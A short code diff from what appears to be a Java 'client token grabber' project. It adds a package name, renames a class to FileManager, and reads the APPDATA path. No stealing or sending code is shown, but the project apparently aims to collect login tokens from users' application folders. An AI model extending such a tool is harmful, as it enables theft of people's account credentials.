@@ -1,9 +1,11 @@
+package main.java.clienttokengrabber.utils;
+
 import java.nio.file.Paths;
 import java.util.List;
 import java.util.ArrayList;
 import java.io.File;
 
-public class DefaultPaths {
+public class FileManager {
     public static final String ROAMING = System.getenv("APPDATA");
     private static List<String> defaultPaths = new ArrayList<>();
 
